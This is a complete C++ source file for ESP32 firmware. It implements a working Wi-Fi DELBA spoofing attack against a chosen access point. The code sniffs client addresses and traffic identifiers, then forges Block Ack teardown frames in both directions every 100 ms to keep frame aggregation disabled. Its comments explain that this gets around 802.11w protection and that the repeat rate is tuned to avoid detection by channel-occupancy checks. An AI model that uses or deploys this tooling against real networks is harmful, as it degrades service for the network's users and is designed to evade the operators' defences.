// DELBA (Block Ack session teardown) spoofing.
//
// Design notes (why it is shaped this way):
//   * DELBA is category 3 (Block Ack), not one of the robust management frames,
//     so 802.11w/PMF does not verify it. That is why it still works where deauth
//     is dropped.
//   * A peer only acts on a DELBA for a TID it currently has a session on;
//     mac80211 (and every other driver) silently drops the rest. So sending
//     DELBA blind to every TID is mostly a no-op -- the useful trigger is the
//     ADDBA Request/Response that announces a session. The sniffer hands those
//     to a small queue and the main loop answers within a few ms.
//     The ESP32 promiscuous filter only delivers *broadcast* management frames
//     plus data frames (unicast ADDBA never shows up), so the TID set is also
//     learned from the QoS control field of the client's data frames -- that is
//     what keeps the sweep on the TIDs that actually have a session.
//   * Both directions are forged: AP -> STA (the AP appears to tear down) and
//     STA -> AP (the client appears to tear it down). Either side dropping the
//     session is enough to lose A-MPDU aggregation.
//   * The periodic sweep exists because a client that gets its session torn down
//     keeps data flowing (it just falls back to single-frame ACKs) and re-sends
//     ADDBA when the driver decides it is worth it; repeating the teardown for
//     the TIDs already observed keeps aggregation off.

#include "delba.h"

#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <string.h>

#include "deauth.h"

namespace {

const uint8_t kBroadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

// 802.11-2020 Table 9-92, the DELBA reasons a real peer actually uses.
//   1  = unspecified
//   32 = unspecified, QoS related
//   37 = requested from peer STA as it does not want to use the mechanism
//   38 = unspecified, QoS related (from the peer)
//   39 = the peer does not support the requested mechanism
const uint16_t kDefaultReason = 37;

const int kMaxClients = 8;
const int kMaxPending = 8;
// Repeat interval for one client (up to 8 TIDs, both directions) / for one
// blind group-addressed TID. 100 ms keeps the session from being usable again
// without turning into a frame flood that a channel-occupancy check would spot.
const uint32_t kSweepMs = 100;
// Sequence control of the frames we forge: same value CSA uses, i.e. a fixed
// non-zero sequence number rather than 0 (which looks like a retry of a frame
// nobody sent).
const uint8_t kSeqCtrlHigh = 0xF0;
const uint8_t kSeqCtrlLow = 0xFF;

bool s_active = false;
uint8_t s_bssid[6];
uint8_t s_channel;
uint16_t s_reason = kDefaultReason;

uint32_t s_frames;
uint32_t s_sweeps;
uint32_t s_addba_seen;
uint32_t s_bar_seen;  // BlockAck / BlockAckReq control frames seen
uint32_t s_triggered;
uint32_t s_blind;
uint32_t s_reverse;
uint32_t s_last_ms;
int s_cursor;

struct client_t {
    uint8_t mac[6];
    uint8_t tids;  // bitmap of TIDs announced by this client
};

client_t s_clients[kMaxClients];
int s_client_count;

// ADDBA -> DELBA hand-off. Written by the sniffer, drained by delba_step().
struct pending_t {
    uint8_t mac[6];
    uint8_t tid;
};

pending_t s_pending[kMaxPending];
volatile int s_pending_head = 0;  // producer (sniffer)
volatile int s_pending_tail = 0;  // consumer (main loop)

// DELBA action frame: 24 B header + category(3) + action(2) + parameter set +
// reason code.
//   DELBA Parameter Set: bit 11 = Initiator, bits 12..15 = TID.
// The initiator flag claims "I (the AP) am tearing the session down", which is
// exactly what a real AP sends when it stops aggregating.
size_t build_delba(uint8_t* frame, const uint8_t da[6], const uint8_t sa[6],
                   const uint8_t bssid[6], uint8_t tid, bool initiator, uint16_t reason) {
    memset(frame, 0, 32);
    frame[0] = 0xD0;  // management, subtype 13 = action
    frame[1] = 0x00;
    memcpy(frame + 4, da, 6);
    memcpy(frame + 10, sa, 6);
    memcpy(frame + 16, bssid, 6);
    frame[22] = kSeqCtrlHigh;
    frame[23] = kSeqCtrlLow;
    frame[24] = 3;  // category: block ack
    frame[25] = 2;  // action: DELBA
    uint16_t params = (uint16_t)((tid & 0x0F) << 12);
    if (initiator) {
        params = (uint16_t)(params | 0x0800);
    }
    frame[26] = (uint8_t)(params & 0xFF);
    frame[27] = (uint8_t)(params >> 8);
    frame[28] = (uint8_t)(reason & 0xFF);
    frame[29] = (uint8_t)(reason >> 8);
    return 30;
}

bool tx(uint8_t* frame, size_t len) {
    if (esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false) != ESP_OK) {
        return false;
    }
    s_frames++;
    return true;
}

// AP -> STA: the AP appears to stop aggregating for that TID.
bool send_from_ap(const uint8_t sta[6], uint8_t tid) {
    uint8_t frame[32];
    const size_t len = build_delba(frame, sta, s_bssid, s_bssid, tid, true, s_reason);
    return tx(frame, len);
}

// STA -> AP: the client appears to tear its own session down. Covers stacks that
// filter DELBA "not sent by my AP" less strictly in this direction.
bool send_from_sta(const uint8_t sta[6], uint8_t tid) {
    uint8_t frame[32];
    const size_t len = build_delba(frame, s_bssid, sta, s_bssid, tid, true, s_reason);
    if (!tx(frame, len)) {
        return false;
    }
    s_reverse++;
    return true;
}

// Group-addressed DELBA: the only frame we can aim at "whoever is listening"
// before a client MAC is known. Most peers ignore it without a session, so it is
// a fallback that also proves the format on the air.
bool send_group(uint8_t tid) {
    uint8_t frame[32];
    const size_t len = build_delba(frame, kBroadcast, s_bssid, s_bssid, tid, true, s_reason);
    if (!tx(frame, len)) {
        return false;
    }
    s_blind++;
    return true;
}

int find_client(const uint8_t* mac) {
    for (int i = 0; i < s_client_count; i++) {
        if (memcmp(s_clients[i].mac, mac, 6) == 0) {
            return i;
        }
    }
    return -1;
}

int note_client(const uint8_t* mac) {
    const int found = find_client(mac);
    if (found >= 0) {
        return found;
    }
    if (s_client_count >= kMaxClients) {
        return -1;  // keep the list stable: entries are never shifted out
    }
    memcpy(s_clients[s_client_count].mac, mac, 6);
    s_clients[s_client_count].tids = 0;
    return s_client_count++;
}

void enqueue_pending(const uint8_t* mac, uint8_t tid) {
    const int next = (s_pending_head + 1) % kMaxPending;
    if (next == s_pending_tail) {
        return;  // queue full: the sweep covers it
    }
    memcpy(s_pending[s_pending_head].mac, mac, 6);
    s_pending[s_pending_head].tid = tid;
    s_pending_head = next;
}

// Counts frames of the target BSS once so the sweep loops know which TIDs are
// worth mentioning.
uint8_t sweep_mask(const client_t* c) {
    return c->tids != 0 ? c->tids : 0xFF;  // nothing learned yet: try every TID
}

}  // namespace

bool delba_start(int index, uint16_t reason) {
    const uint8_t* bssid = WiFi.BSSID(index);
    if (bssid == nullptr) {
        return false;
    }
    if (!delba_reason_is_defined(reason)) {
        return false;
    }
    memcpy(s_bssid, bssid, 6);
    s_channel = (uint8_t)WiFi.channel(index);
    s_reason = reason;
    s_frames = 0;
    s_sweeps = 0;
    s_addba_seen = 0;
    s_bar_seen = 0;
    s_triggered = 0;
    s_blind = 0;
    s_reverse = 0;
    s_client_count = 0;
    s_cursor = 0;
    s_pending_head = 0;
    s_pending_tail = 0;
    s_last_ms = millis();

    esp_wifi_set_channel(s_channel, WIFI_SECOND_CHAN_NONE);
    // The receive callback is what makes the ADDBA-triggered path possible: with
    // promiscuous mode on but no callback the radio hears nothing and the attack
    // silently degrades to blind group-addressed DELBA.
    attack_sniffer_enable();
    s_active = true;
    return true;
}

void delba_stop(void) {
    s_active = false;
}

void delba_step(void) {
    if (!s_active) {
        return;
    }

    // Precise path first: these sessions were just announced, so the DELBA lands
    // while the peer still has the (client, TID) state installed.
    while (s_pending_tail != s_pending_head) {
        uint8_t mac[6];
        const uint8_t tid = s_pending[s_pending_tail].tid;
        memcpy(mac, s_pending[s_pending_tail].mac, 6);
        s_pending_tail = (s_pending_tail + 1) % kMaxPending;
        if (send_from_ap(mac, tid)) {
            s_triggered++;
        }
    }

    const uint32_t now = millis();
    if (now - s_last_ms < kSweepMs) {
        return;
    }
    s_last_ms = now;
    s_sweeps++;

    if (s_client_count == 0) {
        send_group((uint8_t)(s_sweeps & 0x07));
        return;
    }

    const client_t* c = &s_clients[s_cursor];
    s_cursor = (s_cursor + 1) % s_client_count;
    const uint8_t mask = sweep_mask(c);
    for (uint8_t tid = 0; tid < 8; tid++) {
        if ((mask & (1u << tid)) == 0) {
            continue;
        }
        send_from_ap(c->mac, tid);
        send_from_sta(c->mac, tid);
    }
}

void delba_on_rx(const uint8_t* frame, uint16_t len, uint8_t type, uint8_t subtype) {
    // 16 bytes covers RA/TA, which is all a BlockAck Request carries -- the old
    // 24 byte gate threw every BAR away before its TID was ever looked at.
    if (!s_active || len < 16) {
        return;
    }
    const uint8_t* dest = frame + 4;
    const uint8_t* src = frame + 10;
    // Control frames have no Addr3: bytes 16..21 there are BA control + bitmap.
    const bool has_addr3 = (type != 1) && len >= 22;
    const bool on_target = memcmp(src, s_bssid, 6) == 0 || memcmp(dest, s_bssid, 6) == 0 ||
                           (has_addr3 && memcmp(frame + 16, s_bssid, 6) == 0);
    if (!on_target) {
        return;
    }

    // The peer is whichever address is not the AP.
    const uint8_t* peer = memcmp(src, s_bssid, 6) == 0 ? dest : src;
    if (memcmp(peer, kBroadcast, 6) == 0 || memcmp(peer, s_bssid, 6) == 0) {
        return;
    }
    if ((peer[0] & 0x01) != 0) {
        return;  // multicast
    }
    const int idx = note_client(peer);
    if (idx < 0) {
        return;
    }

    // A QoS data frame names its TID right in the header, and data frames *are*
    // delivered by the ESP32 promiscuous filter while unicast management frames
    // (ADDBA!) are not. So the TID a client really uses is learned from its data
    // traffic, which keeps the sweep narrow instead of spraying all 8 TIDs.
    if (type == 2 && (subtype & 0x08) != 0 && len >= 26) {
        const uint8_t tid = (uint8_t)(frame[24] & 0x0F);
        s_clients[idx].tids = (uint8_t)(s_clients[idx].tids | (1u << (tid & 0x07)));
    }

    // Block Ack / Block Ack Request (control frames, subtype 11 / 8): the BA
    // Control field sits at offset 16 and carries the TID in bits 2..5. A BA on
    // the air only exists while a session is live, so this is the most direct
    // TID source there is. (The radio hardware answers BA in firmware, so most
    // chips -- ESP32 included -- hand very few of them up in promiscuous mode.)
    if (type == 1 && (subtype == 8 || subtype == 11) && len >= 18) {
        const uint16_t ba_ctrl = (uint16_t)(frame[16] | (frame[17] << 8));
        const uint8_t tid = (uint8_t)((ba_ctrl >> 2) & 0x0F);
        s_clients[idx].tids = (uint8_t)(s_clients[idx].tids | (1u << (tid & 0x07)));
        s_bar_seen++;
        return;
    }

    // Only ADDBA Request (action 0) / Response (action 1) matter here: they are
    // the only frames that tell us a session exists (and for which TID).
    if (type != 0 || subtype != 13 || len < 31) {
        return;
    }
    if (frame[24] != 3) {
        return;  // not the block ack category
    }
    const uint8_t action = frame[25];
    uint8_t tid;
    if (action == 0) {
        // ADDBA Request: cat, action, dialog token, parameter set, timeout.
        const uint16_t params = (uint16_t)(frame[27] | (frame[28] << 8));
        tid = (uint8_t)((params >> 2) & 0x0F);
    } else if (action == 1) {
        // ADDBA Response carries a status code before the parameter set: a
        // declined response means no session was created, so do not answer it.
        const uint16_t status = (uint16_t)(frame[27] | (frame[28] << 8));
        if (status != 0) {
            return;
        }
        if (len < 33) {
            return;
        }
        const uint16_t params = (uint16_t)(frame[29] | (frame[30] << 8));
        tid = (uint8_t)((params >> 2) & 0x0F);
    } else {
        return;
    }
    s_addba_seen++;
    s_clients[idx].tids = (uint8_t)(s_clients[idx].tids | (1u << (tid & 0x07)));
    enqueue_pending(peer, tid);
}

void delba_selftest(void) {
    static const uint8_t placeholder[6] = {0x02, 0x11, 0x22, 0x33, 0x44, 0x55};
    if (s_bssid[0] == 0 && s_bssid[1] == 0 && s_bssid[2] == 0) {
        memcpy(s_bssid, placeholder, 6);
    }
    static const uint8_t fake_sta[6] = {0x02, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE};
    uint8_t frame[32];

    Serial.print("DELBATEST reason=");
    Serial.println((unsigned)s_reason);
    for (uint8_t tid = 0; tid < 8; tid += 3) {  // 0 and 3 and 6
        const size_t len =
            build_delba(frame, fake_sta, s_bssid, s_bssid, tid, true, s_reason);
        const uint16_t params = (uint16_t)(frame[26] | (frame[27] << 8));
        Serial.printf("DELBATEST ap_to_sta len=%u cat=%u act=%u tid=%u init=%u reason=%u hex=",
                      (unsigned)len, (unsigned)frame[24], (unsigned)frame[25],
                      (unsigned)((params >> 12) & 0x0F), (unsigned)((params >> 11) & 0x01),
                      (unsigned)(frame[28] | (frame[29] << 8)));
        for (size_t i = 0; i < len; i++) {
            Serial.printf("%02X", frame[i]);
        }
        Serial.println();
    }
    const size_t rlen = build_delba(frame, s_bssid, fake_sta, s_bssid, 0, true, s_reason);
    Serial.print("DELBATEST sta_to_ap hex=");
    for (size_t i = 0; i < rlen; i++) {
        Serial.printf("%02X", frame[i]);
    }
    Serial.println();
}

bool delba_active(void) {
    return s_active;
}

bool delba_reason_is_defined(uint16_t code) {
    return code == 1 || code == 32 || code == 37 || code == 38 || code == 39;
}

uint32_t delba_frames(void) {
    return s_frames;
}

uint32_t delba_clients(void) {
    return (uint32_t)s_client_count;
}

uint8_t delba_tid_mask(void) {
    uint8_t mask = 0;
    for (int i = 0; i < s_client_count; i++) {
        mask = (uint8_t)(mask | s_clients[i].tids);
    }
    return mask;
}

uint32_t delba_addba_seen(void) {
    return s_addba_seen;
}

uint32_t delba_bar_seen(void) {
    return s_bar_seen;
}

uint32_t delba_triggered(void) {
    return s_triggered;
}

uint32_t delba_blind_frames(void) {
    return s_blind;
}

uint32_t delba_reverse_frames(void) {
    return s_reverse;
}

uint32_t delba_sweeps(void) {
    return s_sweeps;
}

uint8_t delba_channel(void) {
    return s_channel;
}

uint16_t delba_reason(void) {
    return s_reason;
}
